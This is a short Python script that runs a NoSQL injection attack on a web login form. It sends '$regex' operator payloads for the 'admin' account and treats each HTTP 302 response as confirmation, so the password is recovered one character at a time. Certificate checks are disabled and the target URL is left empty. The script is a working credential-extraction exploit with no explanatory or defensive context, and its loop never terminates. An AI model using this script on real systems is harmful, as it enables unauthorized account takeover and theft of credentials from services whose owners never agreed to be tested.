import requests
import urllib3
import string
import urllib
import sys
urllib3.disable_warnings()


username = "admin"
password = ""
url = ""

print("[+] User: %s" % (username))
while True:
    for c in string.printable:
        if c not in ['*','+','?','|', '#', '.', '$']:
            payload = {'username[$eq]':'%s' %(username), 'password[$regex]': '^%s' %(password + c), 'login' : 'login' }
            req = requests.post(url, data=payload, verify=False, allow_redirects=False)
            if req.status_code == 302:
                print("[+] Found one more character: %s" % (password + c))
                password += c
